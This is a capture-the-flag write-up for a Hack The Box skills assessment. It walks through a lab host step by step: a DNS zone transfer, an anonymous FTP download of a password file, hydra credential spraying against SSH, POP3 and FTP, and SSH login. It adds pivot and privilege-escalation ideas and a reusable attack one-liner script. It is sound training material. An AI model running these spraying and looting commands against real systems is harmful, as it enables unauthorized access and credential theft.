# Attacking Common Services — Skills Assessment II (Medium)

**Completed:** May 8, 2026
**Flag:** `HTB{1qay2wsx3EDC4rfv_M3D1UM}`
**Final shell:** `simon@lin-medium` via SSH

---

## Scenario Recap

Single Ubuntu 20.04 host (`lin-medium`) on the `inlanefreight.htb` zone. Multiple network services exposed; goal is `/home/simon/flag.txt`. The trick is that the foothold cred is **not** brute-forceable — it lives inside an anonymous-FTP loot dump.

## Attack Chain (TL;DR)

```
nmap → 22/53/110/995/2121/30021 open
dig AXFR @target inlanefreight.htb            # leaks int-ftp, int-nfs, dc1/dc2, ws1/ws2, app, un
ftp anonymous → port 2121 (InlaneFTP)         → REJECTED
ftp anonymous → port 30021 (Internal FTP)     → ALLOWED, simon/mynotes.txt (8 candidate pwds)
hydra -l simon -P notes.txt ssh|pop3|ftp:2121 → cred reuse on ALL THREE
ssh simon:8Ns8j1b!23hs4921smHzwn → flag.txt
```

---

## Step 1 — Recon

```bash
export target=10.129.X.X
nmap -Pn -sC -sV -p- --min-rate 2000 $target
```

Open ports observed:

| Port  | Service                                    |
|-------|--------------------------------------------|
| 22    | OpenSSH 8.2p1 Ubuntu                       |
| 53    | ISC BIND 9.16.1 (DNS — AXFR allowed)       |
| 110   | Dovecot POP3 (SASL PLAIN)                  |
| 995   | Dovecot POP3S                              |
| 2121  | ProFTPD `InlaneFTP` (anon REJECTED)        |
| 30021 | ProFTPD `Internal FTP` (anon ALLOWED)      |

Add to `/etc/hosts`:
```
10.129.X.X inlanefreight.htb ns.inlanefreight.htb int-ftp.inlanefreight.htb
```

## Step 2 — DNS Zone Transfer ⚡ KEY STEP

```bash
dig AXFR @$target inlanefreight.htb
```

Yields a goldmine of internal pivot targets:

| Host                                | A record           |
|-------------------------------------|--------------------|
| `int-ftp.inlanefreight.htb`         | `127.0.0.1`        |
| `int-nfs.inlanefreight.htb`         | `10.129.200.70`    |
| `dc1.inlanefreight.htb`             | internal           |
| `dc2.inlanefreight.htb`             | internal           |
| `ws1` / `ws2` / `wsus`              | internal           |
| `app.inlanefreight.htb`             | `10.129.200.5`     |
| `un.inlanefreight.htb`              | `10.129.200.142`   |

The `int-ftp → 127.0.0.1` record is the hint that the **second** ProFTPD instance (port 30021) is the "internal" one supposed to be reachable only from the LAN — but it's exposed externally and accepts anonymous.

> **STUCK NOTE:** Always run `dig AXFR @<target> <zone>` whenever port 53 is open and a domain name is in the scope text. It's free recon, and on this assessment it's the only place that tells you the second FTP exists.

## Step 3 — Anonymous FTP Loot ⚡ KEY STEP

```bash
ftp -n $target 30021
> user anonymous
> passive
> ls
> cd simon
> get mynotes.txt
> bye
```

`mynotes.txt` (153 bytes) is a personal password manager dump — 8 candidate passwords:

```
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

> **STUCK NOTE:** Try **both** ProFTPD ports with `anonymous`. The `InlaneFTP` instance on **2121** rejects it; the `Internal FTP` on **30021** accepts. Don't give up after the first reject.
>
> Also: `ls` over the public-facing FTP looks empty if you forget `passive` — Core/ProFTPD anonymous data channels often need PASV explicitly.

## Step 4 — Credential Spray Across Services

```bash
cp /tmp/simon_loot/mynotes.txt /tmp/simon_pws.txt
hydra -l simon -P /tmp/simon_pws.txt $target ssh   -t 4 -f
hydra -l simon -P /tmp/simon_pws.txt $target pop3  -t 4 -f
hydra -l simon -P /tmp/simon_pws.txt -s 2121 $target ftp -t 4 -f
```

All three hit on the **same** password:

```
simon : 8Ns8j1b!23hs4921smHzwn
```

Massive cred reuse — SSH, POP3 (Dovecot PAM), and the InlaneFTP instance all auth against the same Linux PAM stack.

> **STUCK NOTE:** Don't assume the first password in the list is the one. Spray ALL 8 across SSH first (fastest, no rate-limit on Dovecot/OpenSSH default config). With only 8 candidates and `-t 4`, the whole spray is <10 seconds.
>
> If SSH is `PasswordAuthentication no` for some user, **POP3 still works** — Dovecot is the easiest backdoor when SSH is locked down on Linux ACS boxes.

## Step 5 — SSH In, Grab Flag

```bash
ssh simon@$target
# password: 8Ns8j1b!23hs4921smHzwn
id
# uid=1000(simon) gid=1000(simon) groups=1000(simon),8(mail)
cat ~/flag.txt
# HTB{1qay2wsx3EDC4rfv_M3D1UM}
```

Flag is in simon's home, world-readable, owned by root.

---

## Post-Exploitation Notes (for the curious)

`simon` is in the **`mail` group (gid 8)** — that's the intended privesc vector if you want root:

```bash
ls -la /var/mail        # drwxrwsrwt root:mail (sgid + sticky) — write as mail
ls -la /etc/dovecot     # private/ is 700, conf.d/ readable
```

Other recon worth doing in-session:
```bash
cat ~/.viminfo          # confirms simon edited /var/ftpuser/simon/mynotes.txt
cat ~/.ssh/*            # public key only, no priv key
sudo -l                 # not in sudoers, no creds work
```

Pivot targets (for full network compromise / black-box engagement):
- `int-nfs.inlanefreight.htb` (10.129.200.70) — likely NFS share with simon's UID accessible.
- `app.inlanefreight.htb` (10.129.200.5) — pivot via SSH local forward.
- `dc1` / `dc2` — Active Directory inside.
- ProFTPD 1.3.5+ with two instances — check **CVE-2015-3306 mod_copy** if `mod_copy` is loaded (RCE via `SITE CPFR/CPTO`).

---

## What Took Me Down a Rabbit Hole

**Nothing this time** — the lesson from Easy stuck:
> Username enumeration & loot recon BEFORE password attack.

The natural temptation was to brute SSH with `simon + rockyou` immediately. That's a 14M-attempt waste (and openssh would rate-limit). The correct order:

1. Map services (nmap).
2. **Free recon first** — DNS AXFR, anonymous FTP, SMTP RCPT, SNMP, NFS showmount.
3. Loot anything walking-by reveals.
4. Spray loot creds across every service, not just the obvious one.

---

## Quick-Reference One-Liner

If the box format repeats (BIND + ProFTPD + Dovecot + dual FTP):

```bash
target=10.129.X.X; domain=inlanefreight.htb
echo "$target $domain ns.$domain int-ftp.$domain" | sudo tee -a /etc/hosts

dig AXFR @$target $domain                                    # map internal hosts
nmap -Pn -p- --min-rate 2000 $target                         # find non-standard FTP

# anon-FTP loot sweep on every FTP port
for p in 21 2121 30021; do
  echo "=== $p ==="; curl -s --max-time 5 "ftp://anonymous:x@$target:$p/"
done

# once you find a notes file with passwords, spray:
hydra -L /tmp/users -P /tmp/pws $target ssh  -t 4 -F
hydra -L /tmp/users -P /tmp/pws $target pop3 -t 4 -F

ssh USER@$target
cat ~/flag.txt
```
